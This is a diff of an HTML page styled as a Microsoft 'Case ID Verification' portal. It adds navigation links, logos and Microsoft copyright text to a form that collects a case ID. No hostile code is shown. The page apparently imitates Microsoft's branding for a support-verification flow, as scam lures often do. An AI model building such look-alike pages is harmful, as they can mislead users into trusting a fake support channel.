@@ -9,6 +9,7 @@
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f4f6f9;
     }
+
     .header {
       background-color: #ffffff;
       border-bottom: 1px solid #ccc;
@@ -17,14 +18,35 @@
       justify-content: space-between;
       padding: 14px 30px;
     }
-    .logo {
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .logo-small {
       height: 26px;
     }
-    .header-title {
-      font-size: 17px;
-      font-weight: 600;
-      color: #444;
+
+    .brand-name {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
     }
+
+    .nav-links a {
+      margin-left: 20px;
+      text-decoration: none;
+      color: #444;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .nav-links a:hover {
+      text-decoration: underline;
+    }
+
     .container {
       max-width: 400px;
       background-color: #ffffff;
@@ -34,10 +56,17 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: center;
     }
+
+    .logo-top {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
     h2 {
       margin-bottom: 25px;
       color: #0078d4;
     }
+
     input {
       width: 100%;
       padding: 12px;
@@ -46,6 +75,7 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
+
     button {
       width: 100%;
       padding: 12px;
@@ -57,14 +87,17 @@
       cursor: pointer;
       transition: background-color 0.2s ease-in-out;
     }
+
     button:hover {
       background-color: #005ea6;
     }
+
     .support {
       margin-top: 30px;
       font-size: 14px;
       color: #555;
     }
+
     .footer {
       background-color: #ffffff;
       text-align: center;
@@ -78,12 +111,23 @@
 </head>
 <body>
 
+  <!-- Header -->
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
-    <div class="header-title">Microsoft Case Verification Portal</div>
+    <div class="header-left">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo-small" alt="Microsoft Logo">
+      <div class="brand-name">Microsoft</div>
+    </div>
+    <div class="nav-links">
+      <a href="#">Products</a>
+      <a href="#">Support</a>
+      <a href="#">Downloads</a>
+      <a href="#">Help</a>
+    </div>
   </div>
 
+  <!-- Main Verification Form -->
   <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo-top">
     <h2>Case ID Verification</h2>
     <input type="text" id="caseId" placeholder="Enter your Case ID">
     <button onclick="verifyCase()">Continue</button>
@@ -92,10 +136,12 @@
     </div>
   </div>
 
+  <!-- Footer -->
   <div class="footer">
     © 2025 Microsoft Corporation. All rights reserved.
   </div>
 
+  <!-- Script -->
   <script>
     function verifyCase() {
       const caseId = document.getElementById("caseId").value.trim();
@@ -106,5 +152,6 @@
       }
     }
   </script>
+
 </body>
 </html>
